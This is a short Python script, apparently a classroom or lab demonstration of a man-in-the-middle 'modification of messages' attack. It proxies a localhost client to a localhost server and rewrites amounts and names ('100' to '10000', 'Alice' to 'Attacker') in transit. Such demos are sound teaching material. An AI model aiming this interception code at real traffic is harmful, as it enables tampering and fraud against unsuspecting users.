import socket

# Attacker acts as an intermediate proxy
ATTACKER_HOST = "127.0.0.1"
ATTACKER_PORT = 5001  # Client connects here

REAL_SERVER_HOST = "127.0.0.1"
REAL_SERVER_PORT = 5000  # Attacker connects to real server here


def attack():
    print("=== ATTACK PROGRAM (Modification of Messages) ===")

    # 1. Socket to accept connection from the client
    proxy_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    proxy_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    proxy_server.bind((ATTACKER_HOST, ATTACKER_PORT))
    proxy_server.listen(1)

    print(f"[ATTACKER] Interceptor listening on {ATTACKER_HOST}:{ATTACKER_PORT}...")
    client_conn, client_addr = proxy_server.accept()
    print(f"[ATTACKER] Intercepted client from {client_addr}")

    # 2. Socket to forward traffic to the real server
    real_server_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    real_server_conn.connect((REAL_SERVER_HOST, REAL_SERVER_PORT))
    print(f"[ATTACKER] Connected to real server at {REAL_SERVER_HOST}:{REAL_SERVER_PORT}")

    while True:
        # Intercept client request
        client_data = client_conn.recv(1024)
        if not client_data:
            break

        original_message = client_data.decode()
        print(f"[ATTACKER INTERCEPTED]: '{original_message}'")

        # 3. MODIFICATION: Tamper with message content before forwarding
        modified_message = original_message.replace("100", "10000").replace("Alice", "Attacker")
        print(f"[ATTACKER MODIFIED]: '{modified_message}'")

        # Forward modified payload to the server
        real_server_conn.send(modified_message.encode())

        # Receive real server's response and send it back to client
        server_response = real_server_conn.recv(1024)
        client_conn.send(server_response)

    client_conn.close()
    real_server_conn.close()
    proxy_server.close()


if __name__ == "__main__":
    attack()